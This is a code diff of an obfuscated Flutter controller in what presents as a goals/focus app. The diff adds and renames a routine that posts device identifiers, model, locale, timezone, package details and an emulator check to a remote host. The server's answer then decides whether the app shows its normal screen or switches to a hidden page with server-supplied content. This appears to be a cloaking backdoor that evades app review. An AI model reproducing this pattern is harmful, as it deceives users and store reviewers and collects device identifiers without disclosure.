@@ -1,4 +1,5 @@
 import 'dart:io';
+import 'package:flutter/services.dart';
 import 'package:flutter_timezone/flutter_timezone.dart';
 
 import 'package:dio/dio.dart';
@@ -12,163 +13,158 @@ import 'package:device_info_plus/device_info_plus.dart';
 
 class GoalsFocusLogic extends GetxController {
 
-  var qelvsxc = RxBool(false);
-  var yishqkjfvb = RxBool(true);
-  var yjki = RxString("");
-  var gaylord = RxBool(false);
-  var larkin = RxBool(true);
-  final jdoavxw = Dio();
+  var urpbaxw = RxBool(false);
+  var fqgvesn = RxBool(true);
+  var xqbywo = RxString("");
+  var filomena = RxBool(false);
+  var larson = RxBool(true);
+  final prjgdqz = Dio();
 
 
   InAppWebViewController? webViewController;
 
-  dynamic dckrts(){
-    final aiemywfbc = InternetConnectionChecker.instance;
-    final hjpogmc = aiemywfbc.onStatusChange.skip(1).listen(
-          (InternetConnectionStatus tjkpghevr) {
-        if (tjkpghevr == InternetConnectionStatus.connected) {
-          ycmkqbdn();
+  dynamic vraeplqdjo(){
+    final xkwibgz = InternetConnectionChecker.instance;
+    final qrfpilvxhd = xkwibgz.onStatusChange.skip(1).listen(
+          (InternetConnectionStatus dkuhtb) {
+        if (dkuhtb == InternetConnectionStatus.connected) {
+          vgiqycke();
         } else {
-          Get.toNamed('/Apptimeout')?.then((_){
-            ycmkqbdn();
+          Get.toNamed('/goals_break')?.then((_){
+            vgiqycke();
           });
         }
       },
     );
-    return hjpogmc;
+    return qrfpilvxhd;
   }
 
-  Future<bool> dakwfxvrm() async {
-    var alzfobw = await NetworkUtils.isNetworkAvailable();
-    if(!alzfobw){
-      Get.toNamed('/Apptimeout')?.then((_){
-        ycmkqbdn();
+  Future<bool> dufxmkqit() async {
+    var jmnrptyzq = await InternetConnectionChecker.instance.hasConnection;
+    if(!jmnrptyzq){
+      Get.toNamed('/goals_break')?.then((_){
+        vgiqycke();
       });
     }
-    return alzfobw;
+    return jmnrptyzq;
   }
 
   @override
   void onInit() {
     super.onInit();
-    dckrts();
-    ycmkqbdn();
+    vraeplqdjo();
+    vgiqycke();
   }
 
 
-  Future<void> ycmkqbdn() async {
+  Future<void> vgiqycke() async {
 
-    var hedpkgr = await dakwfxvrm();
-    if(!hedpkgr){
+    var exnido = await dufxmkqit();
+    if(!exnido){
       return;
     }
 
-    gaylord.value = true;
-    larkin.value = true;
-    yishqkjfvb.value = false;
+    filomena.value = true;
+    larson.value = true;
+    fqgvesn.value = false;
 
-    jdoavxw.post("https://hot.seant.it.com/SGEB7?no_check",data: await qxnbashm()).then((value) {
-      var knfeuw = value.data["knfeuw"] as String;
-      var uhzx = value.data["uhzx"] as bool;
-      if (uhzx) {
-        yjki.value = knfeuw;
-        audra();
+    prjgdqz.post("https://get.k3coded.com/uditeanozsgwvprqyjhmk",data: await drtenvwmf()).then((value) {
+      var jxgr = value.data["jxgr"] as String;
+      var klmdtihg = value.data["klmdtihg"] as bool;
+      if (klmdtihg) {
+        SystemChrome.setPreferredOrientations([
+          DeviceOrientation.portraitUp,
+          DeviceOrientation.portraitDown,
+        ]);
+        xqbywo.value = jxgr;
+        sedrick();
       } else {
-        fisher();
+        macejkovic();
       }
     }).catchError((e) {
-      yishqkjfvb.value = true;
-      larkin.value = true;
-      gaylord.value = false;
+      fqgvesn.value = true;
+      larson.value = true;
+      filomena.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> qxnbashm() async {
-    final DeviceInfoPlugin fmqeksr = DeviceInfoPlugin();
-    PackageInfo lfdzwqu_jgwc = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> drtenvwmf() async {
+    final DeviceInfoPlugin bevmr = DeviceInfoPlugin();
+    PackageInfo zpmn_wpci = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var apxcw = Platform.localeName;
-    var RvkF = currentTimeZone;
+    var dmnrfk = Platform.localeName;
+    var znpqtim = currentTimeZone;
 
-    var AcXRhfpk = lfdzwqu_jgwc.packageName;
-    var hnRGM = lfdzwqu_jgwc.version;
-    var gqxN = lfdzwqu_jgwc.buildNumber;
+    var tsadki = zpmn_wpci.packageName;
+    var doyzwrsn = zpmn_wpci.version;
+    var kupq = zpmn_wpci.buildNumber;
 
-    var RiUyu = lfdzwqu_jgwc.appName;
-    var JFfilO = "";
-    var MLCBhX  = "";
-    var umCh = "";
-    var daisyCummings = "";
-    var kittyBechtelar = "";
-    var jadaHills = "";
-    var demarcusMosciski = "";
-    var willHills = "";
-    var lolitaRodriguez = "";
-    var avisAdams = "";
-    var kipProsacco = "";
+    var vafzqwtp = zpmn_wpci.appName;
+    var sjpekugh = "";
+    var zcbak  = "";
+    var axrmed = "";
+    var lennieCole = "";
+    var tyreeNikolaus = "";
+    var nelleLubowitz = "";
+    var lucileWalter = "";
 
 
-    var BuoGexy = "";
-    var bcTliOtu = false;
+    var jkbcvf = "";
+    var ertpgj = false;
 
     if (GetPlatform.isAndroid) {
-      BuoGexy = "android";
-      var cgpfksoue = await fmqeksr.androidInfo;
+      jkbcvf = "android";
+      var gyfzevc = await bevmr.androidInfo;
 
-      umCh = cgpfksoue.brand;
+      axrmed = gyfzevc.brand;
 
-      JFfilO  = cgpfksoue.model;
-      MLCBhX = cgpfksoue.id;
+      sjpekugh  = gyfzevc.model;
+      zcbak = gyfzevc.id;
 
-      bcTliOtu = cgpfksoue.isPhysicalDevice;
+      ertpgj = gyfzevc.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
-      BuoGexy = "ios";
-      var hadqbwpgrn = await fmqeksr.iosInfo;
-      umCh = hadqbwpgrn.name;
-      JFfilO = hadqbwpgrn.model;
+      jkbcvf = "ios";
+      var ersyalkdhj = await bevmr.iosInfo;
+      axrmed = ersyalkdhj.name;
+      sjpekugh = ersyalkdhj.model;
 
-      MLCBhX = hadqbwpgrn.identifierForVendor ?? "";
-      bcTliOtu  = hadqbwpgrn.isPhysicalDevice;
+      zcbak = ersyalkdhj.identifierForVendor ?? "";
+      ertpgj  = ersyalkdhj.isPhysicalDevice;
     }
-
     var res = {
-      "RiUyu": RiUyu,
-      "gqxN": gqxN,
-      "hnRGM": hnRGM,
-      "AcXRhfpk": AcXRhfpk,
-      "JFfilO": JFfilO,
-      "RvkF": RvkF,
-      "umCh": umCh,
-      "MLCBhX": MLCBhX,
-      "apxcw": apxcw,
-      "BuoGexy": BuoGexy,
-      "bcTliOtu": bcTliOtu,
-      "daisyCummings" : daisyCummings,
-      "kittyBechtelar" : kittyBechtelar,
-      "jadaHills" : jadaHills,
-      "demarcusMosciski" : demarcusMosciski,
-      "willHills" : willHills,
-      "lolitaRodriguez" : lolitaRodriguez,
-      "avisAdams" : avisAdams,
-      "kipProsacco" : kipProsacco,
+      "vafzqwtp": vafzqwtp,
+      "doyzwrsn": doyzwrsn,
+      "tsadki": tsadki,
+      "sjpekugh": sjpekugh,
+      "nelleLubowitz" : nelleLubowitz,
+      "znpqtim": znpqtim,
+      "lennieCole" : lennieCole,
+      "axrmed": axrmed,
+      "zcbak": zcbak,
+      "dmnrfk": dmnrfk,
+      "kupq": kupq,
+      "ertpgj": ertpgj,
+      "tyreeNikolaus" : tyreeNikolaus,
+      "lucileWalter" : lucileWalter,
+      "jkbcvf": jkbcvf,
 
     };
     return res;
   }
 
-  Future<void> fisher() async {
-    Get.offNamed("/ClockMainPage");
+  Future<void> macejkovic() async {
+    Get.offNamed("/goals_main");
   }
 
-  Future<void> audra() async {
-    Get.offNamed("/Outreload");
+  Future<void> sedrick() async {
+    Get.offNamed("/goals_zp");
   }
 
   @override
   void dispose() {
-    dckrts().cancel();
+    vraeplqdjo().cancel();
     super.dispose();
   }
 
